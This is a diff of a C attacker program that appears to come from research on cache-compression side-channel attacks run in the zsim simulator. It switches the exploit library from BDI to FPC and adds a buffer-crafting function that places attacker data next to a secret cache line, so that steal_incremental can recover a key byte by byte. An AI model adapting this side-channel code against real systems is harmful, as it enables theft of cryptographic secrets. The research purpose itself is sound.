@@ -9,7 +9,7 @@
 #include "../common/cache_manipulation.h"
 
 #include "../common/zsim_hooks.h"
-#include "../bdi_exploit/steal_bytes.h"
+#include "../fpc_exploit/steal_bytes.h"
 
 #define LINESIZE 64
 
@@ -20,6 +20,7 @@ int data_socket;
 
 unsigned cache_line_size();
 void send_buffer(char *to_send, int keysize);
+void my_send_buffer(char *to_send, int keysize, int position);
 unsigned observe_modifications();
 void accessKey();
 void ciph();
@@ -106,7 +107,7 @@ int main(int argc, char *argv[]){
   unsigned char answer[KEYSIZE];
   bzero(answer, KEYSIZE);
   // Call to the process to get the secret
-  steal_incremental(buffer, answer, &observe_modifications, &send_buffer, KEYSIZE);
+  steal_incremental(buffer, answer, &observe_modifications, &my_send_buffer, KEYSIZE);
   
   printf("[A] Secret value is: ");
   for(int i = 0; i < KEYSIZE; i++) printf("%u,", answer[i]);
@@ -136,7 +137,25 @@ unsigned cache_line_size(){
   return *size;
 }
 
-void send_buffer(char *to_send, int keysize, int position){
+void send_buffer(char *to_send, int keysize){
+	unsigned char buffer[BUFFERSIZE];
+
+	memset(buffer, 1, BUFFERSIZE);
+	buffer[0] = CIPHER;
+
+	// Knowing that there are 2 lines of separation between attacker space and secret cache line
+	//
+	// And that is because of the encrypt function on the server.c file!
+  
+	// Write before the secret...
+	memcpy(&buffer[129], to_send, LINESIZE-keysize);
+
+	bzero(&buffer[LINESIZE*3+1-keysize], 8); // Point to stop
+	
+	int _r = write(data_socket, buffer, BUFFERSIZE);
+}
+
+void my_send_buffer(char *to_send, int keysize, int position){
   unsigned char buffer[BUFFERSIZE];
 
   memset(buffer, 1, BUFFERSIZE);
